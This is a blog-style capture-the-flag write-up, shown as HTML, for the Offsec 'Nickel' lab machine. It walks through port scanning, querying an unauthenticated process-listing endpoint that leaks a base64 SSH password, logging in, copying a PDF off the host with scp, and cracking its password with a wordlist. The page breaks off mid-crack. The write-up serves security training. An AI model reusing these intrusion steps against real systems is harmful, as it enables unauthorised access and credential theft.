@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Writeup - Offsec PG Nickel | kei5uke&#39;s Hacking Note</title>
+<meta property="og:title" content="Writeup - Offsec PG Nickel | kei5uke&#39;s Hacking Note" />
+<meta name="twitter:title" content="Writeup - Offsec PG Nickel | kei5uke&#39;s Hacking Note" />
+<meta itemprop="name" content="Writeup - Offsec PG Nickel | kei5uke&#39;s Hacking Note" />
+<meta name="application-name" content="Writeup - Offsec PG Nickel | kei5uke&#39;s Hacking Note" />
+<meta property="og:site_name" content="kei5uke&#39;s Hacking Note" />
+
+<meta name="description" content="Writeup for PG Hutch">
+<meta itemprop="description" content="Writeup for PG Hutch" />
+<meta property="og:description" content="Writeup for PG Hutch" />
+<meta name="twitter:description" content="Writeup for PG Hutch" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="" />
+  <meta property="og:image" content="" />
+  <meta name="twitter:image" content="" />
+  <meta name="twitter:image:src" content="" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-10-07T00:00:00Z />
+    <meta property="article:published_time" content=2023-10-07T00:00:00Z />
+
+    
+    <meta property="og:article:author" content="Kei5uke" />
+    <meta property="article:author" content="Kei5uke" />
+    <meta name="author" content="Kei5uke" />
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Writeup - Offsec PG Nickel",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-10-07",
+        "description": "Writeup for PG Hutch",
+        "wordCount":  1085 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-10-07",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "kei5uke\u0027s Hacking Note"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.118.2">
+
+    
+
+    <link rel="canonical" href="/posts/nickel/">
+    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "auto" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Writeup - Offsec PG Nickel</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-10-07T00:00:00&#43;00:00" itemprop="datePublished"> 7 Oct 2023 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#nickel">Nickel</a></li>
+    <li><a href="#enumerating-with-threader3000-and-nmap">Enumerating with Threader3000 and Nmap</a></li>
+    <li><a href="#http-enumeration">HTTP Enumeration</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#summary">Summary</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h1 id="nickel">Nickel</h1>
+<h1 id="enumerating-with-threader3000-and-nmap">Enumerating with Threader3000 and Nmap</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">        Threader <span class="m">3000</span> - Multi-threaded Port Scanner          
+</span></span><span class="line"><span class="cl">                       Version 1.0.7                    
+</span></span><span class="line"><span class="cl">                   A project by The Mayor               
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Enter your target IP address or URL here: 192.168.249.99               
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Scanning target 192.168.249.99
+</span></span><span class="line"><span class="cl">Time started: 2023-10-07 23:41:01.488351
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Port <span class="m">22</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">21</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">139</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">135</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">445</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">3389</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">5040</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">8089</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">33333</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49668</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49669</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49666</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49665</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49667</span> is open
+</span></span><span class="line"><span class="cl">Port <span class="m">49664</span> is open
+</span></span><span class="line"><span class="cl">Port scan completed in 0:00:34.808592
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Threader3000 recommends the following Nmap scan:
+</span></span><span class="line"><span class="cl">************************************************************
+</span></span><span class="line"><span class="cl">nmap -p22,21,139,135,445,3389,5040,8089,33333,49668,49669,49666,49665,49667,49664 -sV -sC -T4 -Pn -oA 192.168.249.99 192.168.249.99
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,21,139,135,445,3389,5040,8089,33333,49668,49669,49666,49665,49667,49664 -sV -sC -T4 -Pn -oA 192.168.249.99 192.168.249.99
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-07 23:41 EEST
+</span></span><span class="line"><span class="cl">Stats: 0:01:09 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Service Scan
+</span></span><span class="line"><span class="cl">Service scan Timing: About 93.33% <span class="k">done</span><span class="p">;</span> ETC: 23:42 <span class="o">(</span>0:00:05 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:02:44 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 97.64% <span class="k">done</span><span class="p">;</span> ETC: 23:44 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stats: 0:02:48 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.18% <span class="k">done</span><span class="p">;</span> ETC: 23:44 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.249.99
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.048s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp           FileZilla ftpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: UNIX emulated by FileZilla
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh           OpenSSH for_Windows_8.1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 9c:93:cf:48:a9:4e:70:f4:60🇩🇪e1:a9:c2:c0:b6:ff <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nickel
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2023-10-06T20:00:45
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-06T20:00:45
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2023-10-07T20:45:26+00:00<span class="p">;</span> 0s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: nickel
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: nickel
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.18362
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2023-10-07T20:44:21+00:00
+</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
+</span></span><span class="line"><span class="cl">8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title.
+</span></span></span><span class="line"><span class="cl"><span class="s1">33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span>t have a title.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2023-10-07T20:44:21
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   3:1:1: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 225.99 seconds
+</span></span><span class="line"><span class="cl">------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Combined scan completed in 0:04:25.777045
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/nick<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap --script <span class="s2">&#34;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&#34;</span> -p <span class="m">3389</span> -T4 192.168.249.99                 <span class="m">1</span> ⨯
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-10-07 23:56 EEST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.249.99
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.056s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">3389/tcp open  ms-wbt-server
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-enum-encryption: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Security layer
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     CredSSP <span class="o">(</span>NLA<span class="o">)</span>: SUCCESS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     CredSSP with Early User Auth: SUCCESS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    RDSTLS: SUCCESS
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: NICKEL
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: nickel
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: nickel
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.18362
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2023-10-07T20:56:07+00:00
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 3.70 seconds
+</span></span></code></pre></div><p>MS-WBT-SERVER Enumeration</p>
+<h1 id="http-enumeration">HTTP Enumeration</h1>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/http.png" alt="http.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;h1&gt;DevOps Dashboard&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;hr&gt;
+</span></span><span class="line"><span class="cl">&lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;http://169.254.3.88:33333/list-current-deployments&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;input <span class="nv">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;List Current Deployments&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;http://169.254.3.88:33333/list-running-procs&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;input <span class="nv">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;List Running Processes&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;br&gt;
+</span></span><span class="line"><span class="cl">&lt;form <span class="nv">action</span><span class="o">=</span><span class="s1">&#39;http://169.254.3.88:33333/list-active-nodes&#39;</span> <span class="nv">method</span><span class="o">=</span><span class="s1">&#39;GET&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;input <span class="nv">type</span><span class="o">=</span><span class="s1">&#39;submit&#39;</span> <span class="nv">value</span><span class="o">=</span><span class="s1">&#39;List Active Nodes&#39;</span>&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;
+</span></span><span class="line"><span class="cl">&lt;hr&gt;
+</span></span></code></pre></div><p>The links in the page are not accessible. Let’s enumerate with Curl.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -X GET http://192.168.249.99:33333/                         
+</span></span><span class="line"><span class="cl">Invalid Token
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# curl -X POST http://192.168.249.99:33333/list-running-procs -d <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">name        : System Idle Process
+</span></span><span class="line"><span class="cl">commandline : 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : System
+</span></span><span class="line"><span class="cl">commandline : 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : cmd.exe
+</span></span><span class="line"><span class="cl">commandline : cmd.exe C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\D</span>evTasks.exe --deploy C:<span class="se">\w</span>ork<span class="se">\d</span>ev.yaml --user ariah -p 
+</span></span><span class="line"><span class="cl">              <span class="s2">&#34;Tm93aXNlU2xvb3BUaGVvcnkxMzkK&#34;</span> --server nickel-dev --protocol ssh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : WmiPrvSE.exe
+</span></span><span class="line"><span class="cl">commandline : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\w</span>miprvse.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : SgrmBroker.exe
+</span></span><span class="line"><span class="cl">commandline : 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : SearchIndexer.exe
+</span></span><span class="line"><span class="cl">commandline : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\S</span>earchIndexer.exe /Embedding
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">name        : WmiApSrv.exe
+</span></span><span class="line"><span class="cl">commandline : C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem<span class="se">\W</span>miApSrv.exe
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">name        : cmd.exe
+</span></span><span class="line"><span class="cl">commandline : cmd.exe C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\D</span>evTasks.exe --deploy C:<span class="se">\w</span>ork<span class="se">\d</span>ev.yaml --user ariah -p 
+</span></span><span class="line"><span class="cl">              <span class="s2">&#34;Tm93aXNlU2xvb3BUaGVvcnkxMzkK&#34;</span> --server nickel-dev --protocol ssh
+</span></span></code></pre></div><p>This credential could be something useful.</p>
+<p>I tried to access ssh as the user and with the password however, it does not work.</p>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/decode.png" alt="decode.png"></p>
+<p>It turns out that this is base64 encoded text.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.18362.1016<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ariah@NICKEL C:<span class="se">\U</span>sers<span class="se">\a</span>riah&gt;whoami /priv
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Privilege Name                Description                          <span class="nv">State</span>
+</span></span><span class="line"><span class="cl"><span class="o">=============================</span> <span class="o">====================================</span> <span class="o">=======</span>
+</span></span><span class="line"><span class="cl">SeShutdownPrivilege           Shut down the system                 Enabled
+</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+</span></span><span class="line"><span class="cl">SeUndockPrivilege             Remove computer from docking station Enabled
+</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set</span>       Enabled
+</span></span><span class="line"><span class="cl">SeTimeZonePrivilege           Change the <span class="nb">time</span> zone                 Enabled
+</span></span></code></pre></div><p>I successfully obtained the shell.</p>
+<p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/local.png" alt="local.png"></p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ariah@NICKEL C:<span class="se">\f</span>tp&gt;dir
+</span></span><span class="line"><span class="cl"> Volume in drive C has no label.
+</span></span><span class="line"><span class="cl"> Volume Serial Number is 9451-68F7
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Directory of C:<span class="se">\f</span>tp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">09/01/2020  12:38 PM    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">09/01/2020  12:38 PM    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">09/01/2020  11:02 AM            46,235 Infrastructure.pdf
+</span></span><span class="line"><span class="cl">               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>         46,235 bytes
+</span></span><span class="line"><span class="cl">               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>   7,701,471,232 bytes free
+</span></span></code></pre></div><p>Found interesting directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# scp ariah@192.168.249.99:C:/ftp/Infrastructure.pdf .
+</span></span></code></pre></div><p><img src="Nickel%20cff91a47fb794eae8107f3436b0f1748/pdf.png" alt="pdf.png"></p>
+<p>Downloaded the file and tried to open it, however it’s locked with password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>/opt/generic<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# pdfcrack ~/nick/Infrastructure.pdf -w /usr/share/wordlists/rockyou.txt                                               <span class="m">6</span> ⨯
+</span></span><span class="line"><span class="cl">PDF version 1.7
+</span></span><span class="line"><span class="cl">Security Handler: Standard
+</span></span><span class="line"><span class="cl">V: <span class="m">2</span>
+</span></span><span class="line"><span class="cl">R: <span class="m">3</span>
+</span></span><span class="line"><span class="cl">P: -1060
+</span></span><span class="line"><span class="cl">Length: <span class="m">128</span>
+</span></span><span class="line"><span class="cl">Encrypted Metadata: True
+</span></span><span class="line"><span class="cl">FileID: 14350d814f7c974db9234e3e719e360b
